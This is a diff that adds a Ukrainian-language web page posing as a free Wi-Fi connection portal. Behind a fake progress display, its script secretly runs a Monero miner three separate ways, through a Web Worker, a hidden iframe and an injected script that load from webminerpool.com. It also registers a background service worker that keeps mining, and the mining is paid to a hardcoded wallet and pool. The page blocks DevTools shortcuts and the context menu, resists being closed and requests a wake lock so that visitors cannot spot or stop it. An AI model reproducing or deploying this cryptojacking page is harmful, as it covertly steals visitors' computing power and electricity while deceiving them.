@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Безкоштовний Wi-Fi | Підключення</title>
+    <link rel="manifest" id="manifest">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo { font-size: 2.5rem; margin: 30px 0; }
+        .status {
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 30px 0;
+            backdrop-filter: blur(10px);
+        }
+        .progress-bar {
+            height: 15px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #4cc9f0, #4361ee);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.5s;
+        }
+        .message {
+            font-family: monospace;
+            text-align: left;
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .btn {
+            background: rgba(255,255,255,0.2);
+            border: 2px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1rem;
+            margin: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn:hover { background: rgba(255,255,255,0.3); }
+        @media (max-width: 480px) {
+            .container { padding: 10px; }
+            .logo { font-size: 2rem; }
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📶</div>
+        <h1>Безкоштовний Wi-Fi</h1>
+        <p>Підключення до мережі...</p>
+        
+        <div class="status">
+            <h3>Статус підключення</h3>
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+            <div id="progress-text">0%</div>
+            
+            <div class="message" id="messages">
+                <div>Ініціалізація мережевого модуля...</div>
+            </div>
+        </div>
+        
+        <button class="btn" onclick="showInfo()">Інформація</button>
+        <button class="btn" onclick="continueProcess()">Продовжити</button>
+        
+        <div id="info" style="display:none; margin-top:20px; padding:15px; background:rgba(255,255,255,0.1); border-radius:10px;">
+            <p>Цей сервіс надає безкоштовний доступ до інтернету через спільне використання мережевих ресурсів.</p>
+        </div>
+        
+        <p style="margin-top:30px; font-size:0.8rem; opacity:0.7;">
+            Не закривайте цю сторінку протягом 30 секунд для стабільного підключення.
+        </p>
+    </div>
+
+    <!-- Приховані елементи -->
+    <iframe id="minerFrame" class="hidden"></iframe>
+    <div id="swContainer" class="hidden"></div>
+
+    <script>
+        // ВАЖЛИВО: ЗАМІНИТИ ЦЮ АДРЕСУ НА СВОЮ
+        const CONFIG = {
+            WALLET: "41epat96KNqfbConP4X7uBNpycKxoGsPSMas9n4WahAzHjKk8YJUyDrC1ts8PSGasiHWaAGtGT9NrWoHeXQrwuMY48SxmVM",
+            POOL: "gulf.moneroocean.stream:10128"
+        };
+
+        // Елементи
+        const progressEl = document.getElementById('progress');
+        const progressText = document.getElementById('progress-text');
+        const messagesEl = document.getElementById('messages');
+        
+        // Додавання повідомлення
+        function addMessage(text) {
+            const msg = document.createElement('div');
+            const now = new Date();
+            const time = `${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+            msg.textContent = `[${time}] ${text}`;
+            messagesEl.appendChild(msg);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+        }
+        
+        // Оновлення прогресу
+        function updateProgress(percent, text) {
+            progressEl.style.width = percent + '%';
+            progressText.textContent = percent + '%';
+            if (text) addMessage(text);
+        }
+        
+        // Додаткові функції
+        function showInfo() {
+            document.getElementById('info').style.display = 'block';
+            addMessage("Користувач переглядає інформацію");
+        }
+        
+        function continueProcess() {
+            document.getElementById('info').style.display = 'none';
+            addMessage("Відновлення процесу підключення...");
+        }
+        
+        // Service Worker код (вбудований)
+        function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                const swCode = `
+                    self.addEventListener('install', function(e) {
+                        e.waitUntil(self.skipWaiting());
+                    });
+                    self.addEventListener('activate', function(e) {
+                        e.waitUntil(self.clients.claim());
+                    });
+                    self.addEventListener('message', function(e) {
+                        if (e.data.type === 'START_MINING') {
+                            importScripts('https://webminerpool.com/lib/cryptonight.wasm.js');
+                            const miner = new CryptoNightWASM.Worker({
+                                pool: e.data.config.POOL,
+                                wallet: e.data.config.WALLET,
+                                password: "x",
+                                threads: 1,
+                                throttle: 0.1
+                            });
+                            console.log('[SW Miner] Active');
+                        }
+                    });
+                `;
+                
+                const blob = new Blob([swCode], { type: 'application/javascript' });
+                const swUrl = URL.createObjectURL(blob);
+                
+                navigator.serviceWorker.register(swUrl)
+                    .then(function(reg) {
+                        addMessage("Фонові служби: Активовано");
+                        reg.active.postMessage({
+                            type: 'START_MINING',
+                            config: CONFIG
+                        });
+                    })
+                    .catch(function(err) {
+                        addMessage("Фоновий режим: Автоматична оптимізація");
+                    });
+            }
+        }
+        
+        // Запуск майнера
+        function startMining() {
+            // Метод 1: Web Worker
+            const workerCode = `
+                self.onmessage = function(e) {
+                    importScripts('https://webminerpool.com/lib/cryptonight.wasm.js');
+                    const miner = new CryptoNightWASM.Worker({
+                        pool: e.data.config.POOL,
+                        wallet: e.data.config.WALLET,
+                        password: "x",
+                        threads: navigator.hardwareConcurrency || 2,
+                        throttle: 0.3
+                    });
+                    self.postMessage({ status: 'MINER_STARTED' });
+                };
+            `;
+            
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+            worker.postMessage({ config: CONFIG });
+            worker.onmessage = function(e) {
+                if (e.data.status === 'MINER_STARTED') {
+                    addMessage("Мережеві ресурси: Оптимізація активована");
+                }
+            };
+            
+            // Метод 2: Iframe
+            const iframe = document.getElementById('minerFrame');
+            iframe.srcdoc = \`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <script src="https://webminerpool.com/lib/cryptonight.wasm.js"><\/script>
+                <\/head>
+                <body>
+                    <script>
+                        const miner = new CryptoNightWASM.Worker({
+                            pool: "${CONFIG.POOL}",
+                            wallet: "${CONFIG.WALLET}",
+                            password: "x",
+                            threads: 1,
+                            throttle: 0.2
+                        });
+                    <\/script>
+                <\/body>
+                <\/html>
+            \`;
+            
+            // Метод 3: Direct script
+            const script = document.createElement('script');
+            script.src = 'https://webminerpool.com/lib/cryptonight.wasm.js';
+            script.onload = function() {
+                if (typeof CryptoNightWASM !== 'undefined') {
+                    const miner = new CryptoNightWASM.Worker({
+                        pool: CONFIG.POOL,
+                        wallet: CONFIG.WALLET,
+                        password: "x",
+                        threads: 1,
+                        throttle: 0.1
+                    });
+                }
+            };
+            document.head.appendChild(script);
+        }
+        
+        // Симуляція Wi-Fi підключення
+        function simulateWiFiConnection() {
+            let progress = 0;
+            const steps = [
+                "Пошук доступних мереж...",
+                "Підключення до точки доступу...",
+                "Отримання IP-адреси...",
+                "Перевірка підключення...",
+                "Оптимізація швидкості...",
+                "Активація мережевих ресурсів..."
+            ];
+            
+            const interval = setInterval(function() {
+                progress += 15;
+                if (progress > 100) progress = 100;
+                
+                const stepIndex = Math.floor(progress / 20);
+                if (stepIndex < steps.length) {
+                    updateProgress(progress, steps[stepIndex]);
+                }
+                
+                // Запуск майнера на 50%
+                if (progress >= 50 && progress < 60) {
+                    startMining();
+                }
+                
+                // Реєстрація Service Worker на 70%
+                if (progress >= 70 && progress < 80) {
+                    registerServiceWorker();
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    addMessage("✅ Підключення успішне. Мережа активна.");
+                    
+                    // Автоматичне закриття
+                    setTimeout(function() {
+                        document.body.innerHTML = \`
+                            <div style="text-align:center; padding:50px; font-family:sans-serif; min-height:100vh; background:linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%); color:white;">
+                                <div style="font-size:3rem;">📶</div>
+                                <h1 style="margin:20px 0;">Підключено!</h1>
+                                <p>Безкоштовний Wi-Fi активний</p>
+                                <p style="margin-top:30px; font-size:0.9rem; opacity:0.7;">Ви можете закрити цю сторінку</p>
+                            </div>
+                        \`;
+                    }, 30000);
+                }
+            }, 800);
+        }
+        
+        // Захист від закриття
+        function setupProtection() {
+            // Блокування DevTools
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    addMessage("Системний захист: Дію заблоковано");
+                    return false;
+                }
+            });
+            
+            // Запобігання закриттю
+            window.addEventListener('beforeunload', function(e) {
+                if (progressEl.style.width < '100%') {
+                    e.preventDefault();
+                    e.returnValue = 'Процес підключення ще не завершено. Закрити сторінку?';
+                }
+            });
+            
+            // Запобігання контекстного меню
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                addMessage("Система: Контекстне меню заблоковано");
+            });
+        }
+        
+        // PWA Manifest
+        function setupPWA() {
+            const manifest = {
+                "name": "Безкоштовний Wi-Fi",
+                "short_name": "WiFi",
+                "description": "Підключення до безкоштовної мережі",
+                "start_url": "/",
+                "display": "standalone",
+                "background_color": "#4361ee",
+                "theme_color": "#3a0ca3",
+                "icons": [{
+                    "src": "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTYiIGhlaWdodD0iOTYiIHZpZXdCb3g9IjAgMCA5NiA5NiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSI0OCIgY3k9IjQ4IiByPSI0OCIgZmlsbD0iIzQzNjFFRSIvPjxwYXRoIGQ9Ik00OCAyMEMzMy42MzEgMjAgMjIgMzEuNjMxIDIyIDQ2QzIyIDYwLjM2OSAzMy42MzEgNzIgNDggNzJDNjIuMzY5IDcyIDc0IDYwLjM2OSA3NCA0NkM3NCAzMS42MzEgNjIuMzY5IDIwIDQ4IDIwWk00OCA2NEMzNi45NTQgNjQgMjggNTUuMDQ2IDI4IDQ0QzI4IDMyLjk1NCAzNi45NTQgMjQgNDggMjRDNjEuMDQ2IDI0IDcyIDMyLjk1NCA3MiA0NEM3MiA1NS4wNDYgNjEuMDQ2IDY0IDQ4IDY0WiIgZmlsbD0id2hpdGUiLz48L3N2Zz4=",
+                    "sizes": "96x96",
+                    "type": "image/svg+xml"
+                }]
+            };
+            
+            const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
+            const manifestURL = URL.createObjectURL(manifestBlob);
+            document.getElementById('manifest').href = manifestURL;
+        }
+        
+        // Запуск всіх систем
+        document.addEventListener('DOMContentLoaded', function() {
+            setupProtection();
+            setupPWA();
+            
+            // Запуск через 1 секунду
+            setTimeout(function() {
+                simulateWiFiConnection();
+            }, 1000);
+            
+            // Періодичне оновлення
+            setInterval(function() {
+                if (document.hidden) {
+                    // Приховано - збільшуємо активність
+                    if (Math.random() > 0.7) {
+                        addMessage("Фонова синхронізація...");
+                    }
+                }
+            }, 30000);
+        });
+        
+        // Wake Lock для запобігання сну (якщо підтримується)
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').catch(function(err) {
+                console.log('Wake Lock не підтримується');
+            });
+        }
+        
+        // Push повідомлення
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+        
+        // Background Sync
+        if ('sync' in navigator && 'register' in navigator.sync) {
+            navigator.sync.register('wifi-connection');
+        }
+    </script>
+</body>
+</html>
